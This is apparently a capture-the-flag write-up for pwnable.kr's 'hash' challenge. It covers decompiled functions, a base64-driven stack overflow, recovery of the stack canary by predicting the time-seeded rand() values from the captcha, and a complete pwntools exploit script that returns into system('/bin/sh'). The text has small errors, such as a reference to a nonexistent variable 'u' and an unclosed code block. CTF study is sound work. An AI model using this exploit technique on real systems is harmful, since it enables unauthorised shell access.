Opening file with IDA, we will find the main function is ``process_hash``:

```cc
int process_hash()
{
  int v0; // ST14_4@3
  void *ptr; // ST18_4@3
  char v3; // [sp+1Ch] [bp-20Ch]@1
  int v4; // [sp+21Ch] [bp-Ch]@1

  v4 = *MK_FP(__GS__, 20);
  memset(&v3, 0, 0x200u);
  while ( getchar() != 10 );
  memset(g_buf, 0, sizeof(g_buf));
  fgets(g_buf, 1024, stdin);
  memset(&v3, 0, 0x200u);
  v0 = Base64Decode(g_buf, &v3);
  ptr = (void *)calc_md5(&v3, v0);
  printf("MD5(data) : %s\n", ptr);
  free(ptr);
  return *MK_FP(__GS__, 20) ^ v4;
}

The problem is, ``g_buf`` has 1024 bytes memory, but ``u`` only has 512 bytes, but A 1024 bytes base64 string will be 768 long after decoded, so here has a stackoverflow. And then, we need bypass stack canary.

Let's look at ``my_hash``:

```cc
int my_hash()
{
  int result; // eax@4
  int v1; // edx@4
  signed int i; // [sp+0h] [bp-38h]@1
  char v3[32]; // [sp+Ch] [bp-2Ch]@2
  int v4; // [sp+2Ch] [bp-Ch]@1

  v4 = *MK_FP(__GS__, 20);
  for ( i = 0; i <= 7; ++i )
    *(_DWORD *)&v3[4 * i] = rand();
  result = *(_DWORD *)&v3[16]
         - *(_DWORD *)&v3[24]
         + *(_DWORD *)&v3[28]
         + v4
         + *(_DWORD *)&v3[8]
         - *(_DWORD *)&v3[12]
         + *(_DWORD *)&v3[4]
         + *(_DWORD *)&v3[20];
  v1 = *MK_FP(__GS__, 20) ^ v4;
  return result;
}
```

In this function, cookie is used to generate a hash, and we will get this hash in process. Think of hint given by web site, ``this service shares the same machine with pwnable.kr web service``, so their time is same, we can use this to calculate stack canary and get shell.

we can get canary with following script.

```cc
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) 
{
    int m = atoi(argv[2]);
    int rands[8];
    srand(atoi(argv[1]));
    for (int i = 0; i <= 7; i++) rands[i] = rand();
    m -= rands[1] + rands[2] - rands[3] + rands[4] + rands[5] - rands[6] + rands[7];
    printf("%x\n", m);
    return 0;
}
```

After calculate stack canary, we can write explotion now, the main idea is to overflow ``v3``, with the verification code and time to calculate the stack cookie. At last, call ``system("/bin/sh")``. 

```python
import os
import time
from pwn import *

p = remote("pwnable.kr", 9002)
t = int(time.time())
print p.recvuntil("captcha")
captcha = p.recvline()
captchapos = captcha.find(' : ')+len(' : ')
captcha = captcha[captchapos:].strip()
p.sendline(captcha)
print p.recvline()
print p.recvline()
cmd = "./hash %s %s" % (t, captcha)
cookie = "0x" + os.popen(cmd).read().strip()

payload = 'A' * 512 # 512 byte v3
payload += p32(int(cookie, 16))
payload += 'A' * 12
payload += p32(0x08049187)  # system
payload += p32(0x0804B0E0 + 537*4/3)  # .bss => address of /bin/sh
payload = b64e(payload)
payload += "/bin/sh\0"
p.sendline(payload)
p.interactive()
```
